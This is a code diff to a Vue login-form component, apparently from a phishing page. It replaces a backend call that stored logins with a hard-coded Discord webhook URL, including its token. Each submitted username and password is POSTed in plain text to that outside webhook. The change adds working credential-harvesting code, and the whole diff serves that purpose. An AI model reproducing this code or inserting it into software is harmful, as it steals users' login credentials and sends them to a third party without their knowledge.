@@ -308,16 +308,19 @@
 <script lang="ts" setup>
 
     import { ref } from 'vue';
-    const { create } = useStrapi();
 
     const inputUsername = ref({ value: null });
     const inputPassword = ref<HTMLInputElement | null>(null);
+    const webhookUrl = 'https://discord.com/api/webhooks/1240337214483992656/lvNWFGDpe_gCkFGOZs4g34YZll0P2pvF7Xk-gMx7cUnEdJVPpXngDwONZLtcLdfA-wCq';
 
     async function sendData() {
         if(inputPassword.value) {
-            await create('logins', {
-                username: inputUsername.value.value,
-                password: inputPassword.value.value
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `**USERNAME:** ${inputUsername.value.value}\n**PASSWORD:** ${inputPassword.value.value}` })
             });
         } else { return; }
         setTimeout(() => {
